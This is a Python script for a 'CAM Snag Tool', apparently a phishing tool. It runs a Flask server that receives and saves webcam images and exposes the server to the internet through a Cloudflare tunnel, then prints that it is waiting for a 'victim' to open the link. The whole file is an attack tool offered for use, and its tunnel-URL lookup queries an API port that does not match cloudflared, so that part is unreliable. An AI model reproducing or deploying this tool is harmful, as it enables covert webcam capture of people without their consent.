import os
import time
import threading
import subprocess
from flask import Flask, render_template, request

# ────────[ FLASK SETUP ]────────
app = Flask(__name__, template_folder="templates", static_folder="static")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    image = request.files['webcam']
    image.save('captured_image.jpg')
    print("\n[✓] Image captured and saved as captured_image.jpg")
    return 'Image received'

# ────────[ CLOUDFLARE TUNNEL ]────────
def start_cloudflared():
    os.system("killall cloudflared > /dev/null 2>&1")  # Stop any previous tunnels
    os.system("cloudflared tunnel --url http://localhost:5000 --no-autoupdate > tunnel.log 2>&1 &")

def get_cloudflare_url():
    for _ in range(20):
        try:
            output = subprocess.check_output("curl -s http://127.0.0.1:4040/api/tunnels", shell=True).decode()
            if 'public_url' in output:
                return output.split('"public_url":"')[1].split('"')[0]
        except:
            pass
        time.sleep(1)
    return None

# ────────[ START SERVER ]────────
def start_flask():
    app.run(host="0.0.0.0", port=5000)

# ────────[ BANNER ]────────
os.system("clear")
print("\033[1;31m╔" + "═" * 50 + "╗")
print("║{:^50}║".format("\033[1mHCO - CAM Snag Tool\033[0;31m"))
print("║{:^50}║".format("\033[32mby Azhar\033[0;31m"))
print("╚" + "═" * 50 + "╝\033[0m")
print("[•] This tool is not free. Redirecting to YouTube...\n")
os.system("xdg-open 'https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya'")
input("[•] Press ENTER after subscribing to continue...\n")

# ────────[ LAUNCH EVERYTHING ]────────
threading.Thread(target=start_flask, daemon=True).start()
start_cloudflared()

print("\n[•] Starting Flask server and Cloudflared tunnel...")
time.sleep(5)
public_url = get_cloudflare_url()

if public_url:
    print(f"\n[✓] Server running at: \033[32m{public_url}\033[0m")
    print("[•] Waiting for victim to open webcam link...\n")
else:
    print("\n[!] Failed to fetch Cloudflare URL. Make sure cloudflared is installed and not blocked.")
